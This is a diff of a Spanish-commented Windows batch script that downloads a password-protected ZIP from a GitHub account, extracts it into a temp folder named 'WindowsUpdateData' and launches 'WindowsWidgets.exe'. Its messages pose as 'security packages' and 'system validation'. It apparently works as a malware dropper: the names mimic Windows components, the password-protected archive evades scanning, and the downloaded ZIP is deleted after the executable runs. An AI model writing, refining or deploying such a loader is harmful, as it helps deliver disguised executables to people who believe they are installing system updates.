@@ -1,24 +1,25 @@
 @echo off
-:: Configuración
-set "url=https://raw.githubusercontent.com/deuzinnuse-collab/juego/refs/heads/main/instalar.bat"
-set "tempZip=%TEMP%\update_data.zip"
+:: 1. AQUÍ PONES EL RAW DE TU ZIP (el archivo que subiste a GitHub)
+set "url=https://raw.githubusercontent.com/deuzinnuse-collab/juego/refs/heads/main/tarea.zip"
+
+:: 2. RUTA DONDE SE GUARDARÁ TEMPORALMENTE
+set "tempZip=%TEMP%\tarea.zip"
 set "destDir=%TEMP%\WindowsUpdateData"
 
 if not exist "%destDir%" mkdir "%destDir%"
 
-echo [+] Descargando paquetes de seguridad...
-:: 1. Descarga el archivo desde tu GitHub
+echo [+] Descargando paquetes desde GitHub...
+:: 3. ESTE COMANDO DESCARGA EL ARCHIVO RAW
 powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%tempZip%'"
 
-echo [+] El archivo requiere una clave de acceso.
-:: 2. PowerShell pide la clave y extrae (Nota: El archivo debe ser un ZIP real con contraseña)
+echo [+] El sistema solicita validacion (Introduce la contraseña)...
+:: 4. ESTE COMANDO ABRE EL ZIP Y TE PEDIRÁ LA CLAVE
 powershell -Command "$shell = New-Object -ComObject Shell.Application; $zip = $shell.NameSpace('%tempZip%'); $dest = $shell.NameSpace('%destDir%'); $dest.CopyHere($zip.Items())"
 
 echo [+] Ejecutando...
-:: 3. Abre el ejecutable que ya estará en la carpeta temporal
+:: 5. ESTO CORRE EL PROGRAMA YA EXTRAÍDO
 start "" "%destDir%\WindowsWidgets.exe"
 
-:: Limpieza opcional del ZIP descargado
+:: Limpieza
 del /q "%tempZip%"
 exit
-
